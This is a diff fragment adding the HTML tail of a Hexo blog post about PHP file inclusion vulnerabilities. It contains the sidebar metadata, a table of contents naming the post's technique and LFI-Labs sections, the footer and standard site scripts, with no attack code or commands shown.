+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-07-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/文件包含漏洞/">文件包含漏洞<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/文件包含漏洞/">文件包含漏洞<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#File-Inclusion-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E6%A6%82%E8%BF%B0"><span class="toc-article-text">File Inclusion(文件包含漏洞)概述</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#B%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-article-text">B站视频学习记录</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-article-text">4、文件包含利用方式</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1%E3%80%81%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">1、伪协议</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2%E3%80%8100%E6%88%AA%E6%96%AD"><span class="toc-article-text">2、00截断</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3%E3%80%81%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%EF%BC%88windows%EF%BC%9A256-%EF%BC%9B-linux%EF%BC%9A4096%EF%BC%89"><span class="toc-article-text">3、长度截断（windows：256 ； linux：4096）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4%E3%80%81%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-article-text">4、包含日志文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#5%E3%80%81%E5%8C%85%E5%90%ABsession"><span class="toc-article-text">5、包含session</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-article-text">5 文件包含漏洞的防御</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#php-filter-%E9%9D%9E%E5%B8%B8%E9%87%8D%E8%A6%81"><span class="toc-article-text">php:&#x2F;&#x2F;filter(非常重要)</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#7-php-input%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E5%85%B6%E8%8E%B7%E5%8F%96webshell"><span class="toc-article-text">7 php_input命令执行及其获取webshell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#8-php%E5%8E%8B%E7%BC%A9%E5%8D%8F%E8%AE%AE%E8%8E%B7%E5%8F%96webshell"><span class="toc-article-text">8 php压缩协议获取webshell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#9-php-data%E5%8D%8F%E8%AE%AE%E8%8E%B7%E5%8F%96webshell"><span class="toc-article-text">9 php-data协议获取webshell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10%E3%80%81%E5%88%A9%E7%94%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="toc-article-text">10、利用操作系统的特性绕过</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#LFI-Labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-article-text">LFI_Labs学习记录</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI01"><span class="toc-article-text">LFI01</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI02%E2%80%94%E2%80%94-00%E6%88%AA%E6%96%AD"><span class="toc-article-text">LFI02——**%00截断**</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI03-%E7%82%B9%E5%8A%A0%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-article-text">LFI03-点加斜杠绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI04-%EF%BC%88%E5%8E%BB%E6%8E%89%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-article-text">LFI04-（去掉后缀名绕过）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI05-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-article-text">LFI05-双写绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LFI06"><span class="toc-article-text">LFI06</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95"><span class="toc-article-text">日志目录</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 西伯利亚狼's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
